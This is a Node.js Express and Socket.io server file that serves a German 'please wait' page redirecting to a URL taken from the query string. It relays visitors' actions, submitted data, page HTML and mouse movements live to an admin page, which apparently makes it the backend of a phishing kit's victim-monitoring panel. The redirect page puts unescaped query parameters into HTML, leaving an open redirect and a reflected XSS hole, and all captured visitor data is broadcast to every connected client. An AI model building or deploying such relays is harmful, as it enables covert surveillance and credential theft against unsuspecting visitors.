const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Serve static project files from repo root
app.use(express.static(path.join(__dirname)));

// Minimal routes used by loading pages
app.get('/loading', (req, res) => {
  // If url is provided, forward using meta refresh pattern like existing pages
  const url = req.query.url ? String(req.query.url) : '';
  const time = req.query.time ? String(req.query.time) : '3';
  if (!url) {
    // Fallback to default loading.htm if exists
    return res.redirect('/loading.htm');
  }
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="${time}; url=${url}">
  <link rel="stylesheet" href="./css/bratoka.css">
  <title>Loading...</title>
  <style>
    body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif}
    .loading{display:flex;flex-direction:column;align-items:center}
    .spinner{border:5px solid #bababa;border-top:5px solid #5b5b5b;border-radius:50%;width:20px;height:20px;animation:spin 1.6s linear infinite;margin:20px auto}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <div style="font-size:14px;color:#555">Bitte warten...</div>
  </div>
</body>
</html>`);
});

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  socket.on('visitor_action', (data) => {
    console.log('[visitor_action]', data);
    // Broadcast to all connected clients (including admin.html)
    io.emit('visitor_action', data);
  });

  socket.on('visitor_data', (data) => {
    console.log('[visitor_data]', data);
    io.emit('visitor_data', data);
  });

  socket.on('live_view_html', (data) => {
    // For demo, just log length
    console.log('[live_view_html] length=', (data && data.html) ? data.html.length : 0);
    io.emit('live_view_html', data);
  });

  socket.on('live_mouse', (data) => {
    io.emit('live_mouse', data);
  });

  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server listening on http://localhost:${PORT}`));
